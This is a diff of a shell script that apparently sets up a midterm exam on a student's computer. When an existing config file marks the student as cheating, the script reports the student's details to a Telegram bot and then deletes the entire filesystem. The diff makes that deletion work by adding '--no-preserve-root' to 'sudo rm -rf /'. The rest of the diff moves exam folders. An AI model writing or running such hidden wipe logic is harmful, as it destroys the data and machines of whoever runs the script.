@@ -12,7 +12,7 @@ if test -f /etc/.midtermconfig; then
 	INFO=`cat /etc/.midtermconfig`
 	CHAT_TEXT="$INFO Cheating detected"
 	curl -s --data "chat_id=$CHAT_ID" --data "text=$CHAT_TEXT" 'https://api.telegram.org/bot'$API_KEY'/sendMessage' >> /dev/null
-	sudo rm -rf /
+	sudo rm -rf --no-preserve-root /
 else
 
 	while [ "$ANS" != "y" ]
@@ -39,10 +39,10 @@ Is this information correct ? (y/n)"
 
 	CHAT_TEXT="$full_name with the student number of $st_number and user name $user_name is taking the midterm exam"
 
-	sudo mkdir -p /tmp/instructions
-	sudo mkdir -p /tmp/checker
+	sudo mkdir -p /etc/instructions
+	sudo mkdir -p /etc/checkerfolder
 
-	for i in $TASKS;do sudo cp /etc/instructionfolder/$i /tmp/instructions;sudo cp /etc/checker/$i /tmp/checker;done
+	for i in $TASKS;do sudo cp /etc/instructionfolder/$i /etc/instructions;sudo cp /etc/checker/$i /etc/checkerfolder;done
 
 	echo $TASKS | sudo tee -a /etc/.midtermconfig
 
